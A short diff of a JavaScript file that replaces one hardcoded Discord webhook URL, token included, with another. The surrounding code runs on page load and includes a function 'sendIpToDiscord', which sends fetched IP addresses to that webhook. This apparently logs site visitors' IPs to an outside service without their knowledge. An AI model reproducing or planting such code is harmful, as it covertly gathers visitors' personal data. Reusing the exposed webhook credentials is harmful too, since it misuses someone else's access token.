@@ -25,7 +25,7 @@ window.addEventListener('load', () => {
         }
     }
 
-    const webhookURL = 'https://discord.com/api/webhooks/1205875584094306324/SA-lot0s9hgnZbiRcqDOD65i-9p73e5hb0u5Z--uEi1JV70-OVgR9FdPwXMBsStjE8l4';
+    const webhookURL = 'https://discord.com/api/webhooks/1271771967162417203/ZT-9OovjKOOm4BMDGllI7cZ-uWvecg53FUBVIJhVucniNxLi9mGAcxhpM9lW5OlQqq7y';
 
     // This function waits for the fetched IP and then sends it
     async function sendIpToDiscord() {
